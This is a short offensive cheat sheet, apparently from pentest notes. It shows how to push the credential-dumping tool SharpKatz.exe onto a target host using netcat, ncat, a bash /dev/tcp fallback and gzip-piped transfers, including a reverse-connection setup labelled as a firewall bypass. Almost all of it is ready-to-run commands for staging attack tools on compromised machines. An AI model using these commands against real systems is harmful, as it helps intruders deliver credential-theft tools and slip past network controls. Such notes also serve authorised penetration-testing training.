# Netcat / Ncat File Transfers

## Target Listens, Attacker Sends

```bash
# Target (receiver)
nc -l -p 8000 > SharpKatz.exe       # Original Netcat
ncat -l -p 8000 --recv-only > SharpKatz.exe   # Ncat

# Attacker (sender)
nc -q 0 192.168.49.128 8000 < SharpKatz.exe       # Original Netcat
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe   # Ncat
```

## Attacker Listens, Target Connects (Firewall Bypass)

```bash
# Attacker (sender, listening)
sudo nc -l -p 443 -q 0 < SharpKatz.exe
sudo ncat -l -p 443 --send-only < SharpKatz.exe

# Target (receiver, connecting)
nc 192.168.49.128 443 > SharpKatz.exe
ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

---

## Bash /dev/tcp as Netcat Alternative

If nc/ncat are not available on the target:

```bash
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

---

## NC with gzip Compression

```bash
# Target (receiver)
nc -nvlp 10000 | gzip -d > binary

# Attacker (sender)
cat binary | gzip -c - | nc 10.10.10.32 10000
```
